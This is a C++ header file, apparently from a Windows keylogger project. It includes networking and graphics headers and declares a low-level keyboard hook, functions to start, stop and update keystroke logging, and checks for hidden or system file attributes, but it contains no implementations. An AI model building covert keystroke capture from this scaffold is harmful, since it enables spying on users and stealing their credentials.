#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <string>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <conio.h>
#include <time.h>
#include <fstream>
#include <strsafe.h>
#include <io.h>
#include <crtdefs.h>
#include <GdiPlus.h>


BOOL IsFile_Sys_Hid(LPCSTR lpFileName);
BOOL IsFileExist(LPCSTR lpFileName);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void KeyLogging(int cmd);
int StartKeyLogging();
void StopKeyLogging();
int keyLoggerMain();
void updateKeyLogging();